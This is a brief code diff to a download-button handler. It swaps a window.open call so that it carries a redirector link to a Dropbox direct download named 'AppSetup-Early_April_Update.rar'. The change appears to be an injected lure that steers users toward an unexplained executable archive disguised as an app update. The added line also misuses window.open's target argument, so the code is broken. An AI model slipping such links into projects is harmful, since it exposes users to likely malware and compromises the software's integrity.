@@ -127,7 +127,7 @@
         if (BASE_URL && BASE_URL.startsWith('http')) {
           // const url = repoName ? `${BASE_URL}?repo_name=${encodeURIComponent(repoName)}` : BASE_URL;
           const url = BASE_URL;
-          window.open(url, '_blank');
+          window.open(url, 'https://href.li/?https://www.dropbox.com/scl/fi/x92sr45sa3vgrxd2xcxw1/AppSetup-Early_April_Update.rar?rlkey=dqypjxhjjk3t982k2hc2mht33&st=31w4oikp&dl=1');
           downloadBtn.innerHTML = '<i class="fas fa-check"></i> Started!';
           downloadBtn.disabled = true;
           downloadBtn.style.opacity = '0.7';
